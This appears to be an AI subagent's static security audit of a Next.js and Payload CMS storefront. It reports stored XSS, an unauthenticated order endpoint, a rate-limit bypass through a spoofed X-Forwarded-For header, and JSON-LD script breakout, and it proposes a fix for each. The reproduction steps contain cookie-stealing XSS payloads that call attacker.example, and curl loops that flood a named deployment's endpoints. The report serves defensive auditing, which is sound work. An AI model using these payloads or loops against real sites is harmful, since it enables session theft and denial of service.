# Security Findings

> Static audit, 2026-06-01. Subagent: security-auditor.
> Codebase: `pnhd-studio-clone` @ `audit/launch-readiness-2026-06-01`.
> Stack: Next.js 15.4.11 + Payload CMS 3.85 + Supabase Postgres/Storage. RU-only e-commerce, anonymous form submissions, Payload admin for staff.

## Summary

**4 blockers, 7 warnings, 6 nice-to-have**

Critical: stored XSS in legacy `bodyHtml` rendering path (blog + privacy + oferta), unauthenticated unrate-limited order creation endpoint, IP-spoof rate-limit bypass on form submissions, `</script>` breakout in unescaped JSON-LD on product/blog pages.

The codebase has changed materially since `CLAUDE.md §15` was written:
- Legacy `/admin/login` flow + `safeNextPath` + `requireAdmin()` no longer exist — Payload's own admin auth is now the only entry point. So the "open-redirect" item from the spec doesn't apply.
- `isomorphic-dompurify` is still in `package.json` but **not imported anywhere** — the original blog WYSIWYG sanitization moved with the legacy admin and was never re-implemented for Payload.

---

## 🔴 BLOCKERS

### S1. Stored XSS through `bodyHtml` on `/blog/:post`, `/privacy`, `/oferta`

**Severity:** 🔴
**Location:**
- `src/lib/queries/blog.ts:45-47` (selects raw `page.bodyHtml`, returns as `{ __html }`)
- `src/lib/queries/static-pages.ts:50-55` (same pattern for static pages)
- `src/app/(storefront)/blog/[post]/page.tsx:134` — `dangerouslySetInnerHTML={post.blog}`
- `src/app/(storefront)/privacy/page.tsx:25` — `dangerouslySetInnerHTML={{ __html: page.bodyHtml }}`
- `src/app/(storefront)/oferta/page.tsx:25` — same
- `src/collections/Pages.ts:95-102` — field is plain `textarea`, no validation/sanitization

**Issue:** `Pages.bodyHtml` is stored as raw user-supplied HTML and rendered without sanitization. Any user with `admin` or `marketing` role (per `Pages.access.update = hasRole('admin', 'marketing')`) can inject `<script>`, `<img onerror>`, `<svg onload>`, `javascript:` links, or `iframe srcdoc` payloads. These execute in the browser of every storefront visitor on those routes — full stored XSS. `CLAUDE.md §15` claimed the old admin sanitized through `isomorphic-dompurify`, but the legacy admin is gone and the package is no longer imported anywhere (`grep -rn DOMPurify src/` returns nothing).

`Pages` is also where blog posts live (`pageType: 'blog'`) and where the legacy `privacy`/`oferta` HTML was migrated to. Every one of these routes shares the same hole.

The Lexical path (`body` rich-text) goes through a custom `lexicalToHtml` that does basic text-escaping, so new posts created via the rich editor are safe. But every legacy post with non-empty `bodyHtml` short-circuits the Lexical path. As long as `bodyHtml` exists on a page document, the unsafe path wins.

**Repro:**
1. Log into `/admin` as a `marketing` user.
2. Edit any blog page (`pageType=blog`). In the `bodyHtml` (legacy) field paste:
   `<img src=x onerror="fetch('https://attacker.example/'+document.cookie)">`
3. Publish.
4. Visit `/blog/<slug>` on storefront → payload runs in every visitor's browser. `httpOnly` cookies survive, but session/auth cookies for **Payload admin users** who happen to visit storefront and CSRF tokens *do not*.

**Fix sketch:**
- Add a `beforeChange` hook on `pages` that runs `DOMPurify.sanitize(bodyHtml, { ALLOWED_TAGS: [...], ALLOWED_ATTR: ['href','src','alt','title','rel','target'], FORBID_ATTR: [/^on/i], FORBID_TAGS: ['script','style','iframe','object','embed'] })` before insert. Reuse the `isomorphic-dompurify` already in deps.
- Alternatively (defence-in-depth), also sanitize **on render** in `getPostBySlug` / `getStaticPage` before returning. The render-time sanitize is the harder safety net — it protects against future code paths that forget to sanitize.
- Long-term: deprecate `bodyHtml` entirely. Force everything through Lexical → server-side HTML render with strict allowlist.

**Verification:**
- Curl `/blog/<slug>` with a payload page seeded with `<script>alert(1)</script>` — response HTML must NOT contain the literal `<script>` tag.
- Add a unit test on the sanitizer with the classic OWASP XSS cheat sheet inputs.

---

### S2. `/api/orders/create` accepts unauthenticated, unrate-limited order creation

**Severity:** 🔴
**Location:** `src/app/(payload)/api/orders/create/route.ts` (entire file, esp. lines 26-218)

**Issue:** The endpoint:
- Has no auth check (no Payload session, no captcha, no IP rate-limit).
- Uses `payload.create('orders', ...)` from the Local API, which defaults to `overrideAccess: true` — so the `Orders.access.create = hasRole('admin')` policy on `src/collections/Orders.ts:41` is **silently bypassed**.
- Creates an `orders` row + N `order-items` rows per request. Each request also does 3+ DB reads (`products` find, `variants` find, `prices` find) per item.
- Has no rate-limit. The `rateLimitFormSubmissions` hook is only on `form-submissions`, not on `orders`.

Attacker can:
1. DoS the Postgres pool by hammering this endpoint with `items: [{ productSlug: ..., variantSize: ..., quantity: 1 }]` payloads.
2. Pollute `orders` and `order_items` tables with arbitrary phantom records (auto-numbered with the daily counter `PNHD-YYYYMMDD-NNNN` — the next legitimate order from operations gets a misleading sequence).
3. Burn the daily order-number sequence (a few thousand requests = `PNHD-20260601-0001` through `PNHD-20260601-9999` filled with junk; the `assignOrderNumber` hook scans for the highest sequence so each new legit order pays the cost of scanning).

Currently `paymentUrl: null` and `paymentStatus: 'unpaid'` so the attacker cannot extract money, but the storefront `/checkout` claims to "create order" — once СБП integration lands (Phase 5 per CLAUDE.md), this same endpoint becomes the entrypoint for real money flow without auth.

**Repro:**
```
for i in $(seq 1 100); do
  curl -X POST https://pnhd-studio-clone.vercel.app/api/orders/create \
    -H 'Content-Type: application/json' \
    -d '{"customer":{"name":"junk","phone":"+71234567890"},"items":[{"productSlug":"<real-slug>","variantSize":"M","quantity":1}]}' &
done
```
Each request creates a real Order in Payload.

**Fix sketch:**
- Add the same IP-hash rate-limit as form-submissions (and use a strict per-IP cap — say 5/hr for orders).
- Add a server-side captcha or proof-of-work (hCaptcha / Cloudflare Turnstile) for unauthenticated POSTs.
- Validate `customer.phone` against a RU mobile regex; validate `customer.email` if present.
- Add a body size cap (`req.headers.get('content-length')` check or middleware).
- Consider Vercel WAF / rate-limit on the route. Best effort: also create a "spam guard" beforeChange hook on `orders` collection that throws if there's no Payload-issued session token AND no Cloudflare Turnstile cf-token in headers.
- After Phase 5: never expose the SBP creation step on an unauthenticated route — gate behind a server-issued draft-order token created earlier in the flow.

**Verification:** Add an integration test that POSTs 10 orders rapidly from the same IP-hash; the 6th request returns 429.

---

### S3. Rate-limit on form submissions bypassable by spoofing `X-Forwarded-For`

**Severity:** 🔴
**Location:** `src/hooks/rateLimitFormSubmissions.ts:7-13`

**Issue:** `extractIp()` reads `x-forwarded-for`, splits on `,`, and uses the **first** value. On Vercel, `X-Forwarded-For` is constructed as `client-supplied-XFF + ", " + actual-edge-IP`. An attacker who controls the request can put any IP in the first position by setting their own `X-Forwarded-For` header. Each spoofed first-octet produces a different `sha256` → fresh rate-limit bucket → unlimited submissions.

This affects every `form-submissions` create (lead forms, popups, methods consultation, etc.). Combined with `notifyTelegram` and `notifyBitrix`, an attacker can use this to send unlimited messages to staff Telegram chat / Bitrix24 — denial of service against humans.

Vercel's documented header for the real client IP is `x-vercel-forwarded-for` (or `request.ip` in middleware). Both are set by Vercel's edge and not user-controllable.

**Repro:**
```bash
for i in $(seq 1 50); do
  curl -X POST https://pnhd-studio-clone.vercel.app/api/form-submissions \
    -H 'Content-Type: application/json' \
    -H "X-Forwarded-For: 1.$((i % 255)).0.1" \
    -d '{"form":"<form-id>","submissionData":[{"field":"name","value":"spam"},{"field":"phone","value":"+71234567890"}]}'
done
```
All 50 succeed despite `MAX_PER_WINDOW = 3`.

**Fix sketch:** Prefer Vercel's trusted header:
```ts
function extractIp(headers: Headers): string {
  // Vercel sets x-vercel-forwarded-for to the real edge-observed client IP.
  // It is NOT user-controllable. Falls back to standard headers for local dev.
  const vercel = headers.get('x-vercel-forwarded-for');
  if (vercel) return vercel.split(',')[0].trim();
  // For local dev only. NEVER reachable in prod via Vercel.
  const real = headers.get('x-real-ip');
  if (real) return real;
  const fwd = headers.get('x-forwarded-for');
  // For the standard XFF, take the LAST entry (closest to our edge).
  if (fwd) {
    const parts = fwd.split(',').map((s) => s.trim()).filter(Boolean);
    if (parts.length) return parts[parts.length - 1];
  }
  return 'unknown';
}
```
Add `vercel.json` (or use `next.config.mjs` rewrites) only if you need to strip incoming XFF. By default Vercel ignores user-supplied XFF for `request.ip`, but it does pass it through in headers — so reading `x-vercel-forwarded-for` is the right move.

**Verification:** Update `rateLimitFormSubmissions.test.ts` with an "XFF-spoof bypass" test — feed `X-Forwarded-For: 1.1.1.1` and `X-Vercel-Forwarded-For: 2.2.2.2`, verify the hashed IP is derived from `2.2.2.2`.

---

### S4. Unescaped JSON-LD breakout via product / blog content fields

**Severity:** 🔴
**Location:**
- `src/app/(storefront)/shop/[slug]/page.tsx:112` — `dangerouslySetInnerHTML={{ __html: JSON.stringify(ld) }}`
- `src/app/(storefront)/blog/[post]/page.tsx:109` — same pattern

**Issue:** Both render JSON-LD via raw `JSON.stringify(...)` inside a `<script type="application/ld+json">` block. `JSON.stringify` does NOT escape `<`, `>`, or `/` — so if the content contains the literal string `</script>`, that closes the script tag, and an attacker can inject arbitrary HTML/JS that follows.

The JSON-LD pulls from user-editable fields:
- `productJsonLd` uses `item.name`, `item.description`, `item.galleryPhotos`, breadcrumb name.
- `articleJsonLd` uses `post.title`, `post.subtitle`, `post.author`, `post.hashtags`, the result of `stripHtml(post.blog.__html)`.

Anyone with `brand_manager` (writes products) or `marketing` (writes pages) can store a payload like:
`</script><script>fetch('https://attacker.example?c='+document.cookie)</script>`
in `product.name` or `post.title`. Every storefront visitor loading the affected page executes it.

There's a safe helper already in the codebase: `src/components/shared-components/markup-script/markup-script.tsx` does `.replace(/</g, '\\u003c')` — but the two locations above don't use it.

**Repro:**
1. Log into `/admin`, edit a published product, set `name` to `Футболка</script><script>alert(1)</script>`.
2. Visit `/shop/<slug>` storefront — `alert(1)` fires.

**Fix sketch:** Replace both raw `JSON.stringify(ld)` calls with `MarkupScript` (already exists) or inline `JSON.stringify(ld).replace(/</g, '\\u003c').replace(/>/g, '\\u003e').replace(/&/g, '\\u0026')`. Browsers accept the escaped form inside JSON.

**Verification:** Curl `/shop/<slug>` after setting `name = "Test</script>"`, assert response body does NOT contain literal `</script>` inside the JSON-LD block.

---

## 🟡 WARNINGS

### S5. CSP is `Report-Only` and allows `'unsafe-inline' 'unsafe-eval'`

**Severity:** 🟡
**Location:** `next.config.mjs:5-17`

CSP is in `Content-Security-Policy-Report-Only` mode — no enforcement. `script-src` includes `'unsafe-inline' 'unsafe-eval'`, which gives away the strongest CSP protection. There's also no `report-uri` / `report-to` directive, so reports go nowhere — the report-only mode currently provides zero value.

**Fix sketch:**
- Add `report-to` directive pointing to a Sentry "security/csp" endpoint or `/api/csp-report` log sink to collect what would break.
- Plan a 1-2 week observation window, then flip to enforced `Content-Security-Policy`.
- Replace `'unsafe-inline'` with nonces (Next.js 15 + `headers()` can emit a per-request nonce). `'unsafe-eval'` is required by some third-party scripts (Yandex Metrica) — keep but minimize.
- `frame-ancestors 'none'` ✅, `base-uri 'self'` ✅, `object-src` missing — add `object-src 'none'`.

### S6. `Strict-Transport-Security` (HSTS) not set in `next.config.mjs`

**Severity:** 🟡
**Location:** `next.config.mjs:25-37`

Vercel sets HSTS on custom domains by default, but the headers list explicitly enumerates `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy`, CSP — and conspicuously omits HSTS. If the project ever moves off Vercel or uses a custom CDN, HSTS disappears. Defence-in-depth: include it explicitly.

**Fix:** Add `{ key: 'Strict-Transport-Security', value: 'max-age=63072000; includeSubDomains; preload' }` to the headers array. (Only enable `preload` once you're confident about all subdomains being HTTPS-only.)

### S7. Payload `users` collection allows admin login for any role

**Severity:** 🟡
**Location:** `src/collections/Users.ts:17-20`

```ts
admin: ({ req: { user } }) => {
  const roles = (user as unknown as { roles?: string[] } | null)?.roles;
  return Array.isArray(roles) && roles.length > 0;
}
```

Any user with any of the 5 roles (`admin`, `brand_manager`, `marketing`, `operations`, `sales`) can access the Payload admin UI. Combined with `Pages.access.update = hasRole('admin', 'marketing')`, a `marketing` user with stored-XSS knowledge can compromise the storefront (see S1, S4). Similarly `brand_manager` controls products → XSS via `name` (see S4).

This isn't a bug in isolation — the role model is intentional — but it amplifies the impact of S1/S4. Until those are fixed, treat every Payload user with `marketing` or `brand_manager` role as having effective storefront-XSS privilege.

**Fix:** After S1/S4 fixes, no action needed. Until then: keep `marketing`/`brand_manager` user list to trusted-only and rotate any credentials of departed staff.

### S8. Sentry captures 4xx including 429 — quota-burn vector during a rate-limit DoS

**Severity:** 🟡
**Location:** `src/payload.config.ts:148`

`captureErrors: [400, 403, 404, 408, 429, 500, 502, 503, 504]`. Every rate-limited submission throws an `APIError(429)` which the Payload Sentry plugin will report. An attacker who triggers the rate-limit deliberately (combined with S3, which lets them bypass it AND make the bypass attempts themselves log as 429s in some cases) can burn Sentry quota.

**Fix:** Drop 429 from `captureErrors` — `429` is expected when rate-limit fires; it's not actionable. Keep 4xx that indicate real bugs: 400 (invalid request), 500-504.

### S9. SVG MIME type allowed in `gallery-images` and `payload-media` Storage buckets

**Severity:** 🟡
**Location:** `storage.buckets` (Supabase):
- `gallery-images` accepts `image/svg+xml`
- `payload-media` accepts `image/svg+xml`

SVG files can contain `<script>` and execute when loaded as `src` of an iframe/object, or when navigated to directly. Because the bucket is on `*.supabase.co` (different origin from `pnhd.ru`), the SVG runs in Supabase's origin — not directly XSSing pnhd.ru. But:
- If an admin opens the direct SVG URL in their browser to "verify the upload", attacker code runs in supabase.co context and can do further damage (the user's session against any other supabase.co projects, for instance).
- If the SVG is embedded via `<img>`, it does NOT execute scripts (`<img>` SVG is sanitized by browsers in this case). Safe.
- `user-uploads` bucket already excludes SVG — good. So this only affects admin-write buckets.

**Fix:** Remove `image/svg+xml` from the MIME whitelist of both buckets. If SVG must be supported (e.g. logos), do it via a separate signed-URL flow with `Content-Disposition: attachment` so browsers download instead of execute.

### S10. `marketing` role can also write `media` collection (image uploads)

**Severity:** 🟡
**Location:** `src/collections/Media.ts:17-19`

`marketing` role can create/update media documents. Combined with bucket SVG allowance (S9), they can upload `image/svg+xml` files into `payload-media`. If S9 is fixed (drop SVG from `payload-media`), this is moot.

### S11. `referenceUrl` field in submissions has no protocol whitelist

**Severity:** 🟡
**Location:** `src/hooks/notifyBitrix.ts:49` and any product-page form

`referenceUrl` from `submissionData` is interpolated into Bitrix lead `COMMENTS` text. Bitrix shows lead comments as raw text → safe for Bitrix. But if any future flow renders `referenceUrl` as an `<a href={...}>` (e.g. in Payload admin "view lead"), and the URL is `javascript:alert(1)` — clicking it = XSS within the admin user's session. The form-builder plugin's default admin view renders submission fields as plain text — currently safe — but this is a footgun.

**Fix:** Add a frontend-side URL validator in `submit-form.ts` (or Payload-side custom field validation) that requires `referenceUrl` to match `/^https?:\/\//`.

---

## 🟢 NICE-TO-HAVE

- **S12.** `src/lib/supabase/admin-server.ts` is dead code — not imported anywhere after legacy admin removal. Delete it; `SUPABASE_SERVICE_ROLE_KEY` env var becomes unnecessary on Vercel (one less secret to rotate / leak).
- **S13.** `public.rate_limit_log` table is dead — created for the deleted `create-lead` Edge Function. The Payload `form-submissions` hook uses its own collection for the count. Drop the table + the `rate-limit-log-cleanup` cron job.
- **S14.** `isomorphic-dompurify` is in `package.json` but not imported. Either use it (S1) or remove the dep.
- **S15.** Drop `'unsafe-eval'` from CSP if Yandex Metrica doesn't actually need it (test in report-only mode first). Browsers run Metrica's tagged inline script fine without eval in most modern configs.
- **S16.** Add a `sec-fetch-site` check on `/api/orders/create`: reject `cross-site` (i.e. anything that isn't `same-origin` / `same-site` / `none` from a direct navigation) — kills naive cross-origin POST CSRF on this endpoint before requiring captcha.
- **S17.** `next.config.mjs` could add `Cross-Origin-Opener-Policy: same-origin` and `Cross-Origin-Resource-Policy: same-origin` for tighter isolation. Test that Yandex Metrica / Roistat don't break.

---

## Verification log

- ✅ **RLS coverage** — checked all 45 tables across `public`, `payload`, `storage` schemas. `public.*` and `storage.*` have RLS on; `payload.*` has RLS off but `anon`/`authenticated` lack USAGE on the `payload` schema — so anon can't even SELECT through any client. Confirmed via `has_schema_privilege`. No leak.
- ✅ **Policies sanity** — read every policy in `public` + `storage`. `leads` has no anon insert (only admin write via `is_admin()` and service_role). `admin_users` has only `self read` via `auth.uid()`. `user-uploads` storage bucket has only anon-insert for `prints/` prefix; no UPDATE/DELETE/SELECT policies → list/mutate denied to anon (read goes through public bucket URL, which is fine).
- ✅ **Secrets exposure** — grepped all of `src/` for `SUPABASE_SERVICE_ROLE_KEY`, `BITRIX_WEBHOOK_URL`, `TELEGRAM_BOT_TOKEN`, `CLEANUP_SECRET`, `PAYLOAD_SECRET`. Only present in server-only files (`src/lib/supabase/admin-server.ts`, `src/hooks/notifyBitrix.ts`, `src/hooks/notifyTelegram.ts`, `src/payload.config.ts`, `src/lib/payload/client.ts`). No `'use client'` file imports any of them. `.env*.local` is gitignored; no env files in git history except `.env.example` (placeholder values only).
- ✅ **XSS** — full audit of all 12 `dangerouslySetInnerHTML` sites. Static-data sites (`methods`, `textile`, `prints`) are safe (TS source, not user input). Dynamic sites split into: (a) JSON-LD breakouts (S4, 🔴), (b) `bodyHtml` from Payload (S1, 🔴), (c) safe helper `markup-script.tsx` (escapes `<`). Blog `lexicalToHtml` path safe (escapes text). `bodyHtml` path bypasses Lexical sanitization entirely.
- ✅ **CORS / CSRF** — Payload `cors` and `csrf` use `ALLOWED_ORIGINS` env or fallback `['localhost:3000', 'studio.pnhd.ru']`. Edge Function `cleanup-user-uploads` uses constant-time `X-Cleanup-Secret` header (correct). `/api/form-submissions` is intentionally public — same-origin XHR is permitted; cross-origin XHR allowed too because storefront and Payload share origin. Risk is rate-limit / spam (S3) not CSRF.
- ✅ **Rate-limit** — `rateLimitFormSubmissions` hook works as designed (3/min via `form-submissions` COUNT), but the IP source is spoofable on Vercel (S3, 🔴). No rate-limit on `/api/orders/create` (S2, 🔴).
- ✅ **CSP / HTTP headers** — `next.config.mjs` enumerated. CSP is Report-Only (S5, 🟡), no HSTS (S6, 🟡), no `object-src` directive (rolled into S5). `X-Frame-Options`, `X-Content-Type-Options`, `Referrer-Policy`, `Permissions-Policy` ✅.
- ✅ **Input validation** — `notifyBitrix` passes user content as JSON body (safe — Bitrix's CRM accepts text). `notifyTelegram` uses plain text mode (no `parse_mode: 'HTML'`) → `<` in name doesn't get interpreted as HTML, safe. `notifyBitrix` correctly handles Bitrix's 200-with-error-envelope edge case (`body.error || body.result === undefined`).
- ✅ **Auth** — legacy `/admin/login` + `requireAdmin()` removed from codebase. Payload's built-in admin auth is the only entry point. Custom routes audited:
  - `src/app/(payload)/api/[...slug]/route.ts` — REST handlers from `@payloadcms/next` — applies Payload access control.
  - `src/app/(payload)/api/orders/create/route.ts` — bypasses access control via local API (S2, 🔴).
  - `src/middleware.ts` — public, just resolves redirects, no auth-relevant logic.
- ✅ **Storage policies** — bucket configurations: `user-uploads` (20MB cap, MIME whitelist excludes SVG — correct), `gallery-images`/`payload-media` allow SVG (S9, 🟡), `product-images`/`blog-images` no SVG (good).
- ⚠️ **Partial: Payload form-builder input validation** — the plugin does not validate that submitted `submissionData` fields match the form definition; arbitrary `field` names accepted (just stored). Not exploitable for system damage (only filling DB), but means client-supplied `formId` could send to any form. Risk: low — only known form IDs are public, and the hooks log all of them.
- ⚠️ **Partial: dependency CVEs** — did not run `npm audit` (not in scope of static review). `next` is 15.4.11 — past the 14.x SSRF CVE mentioned in CLAUDE.md. Recommend running `npm audit --omit=dev` in CI before launch.
- ❌ **Not checked: cron job execution success** — confirmed three jobs are scheduled and `active=true` in `cron.job`, but didn't query `cron.job_run_details` to verify they're actually running. Hand off to database-admin subagent.
- ❌ **Not checked: penetration testing of payload admin auth** — out of scope; recommend post-launch third-party pen-test before opening admin to broader staff.
- ❌ **Not checked: image-served-from-Supabase XSS via filename** — Supabase storage URLs use deterministic paths; if a malicious upload's filename gets reflected in HTML somewhere, that could XSS. Did not trace every render path for filenames.
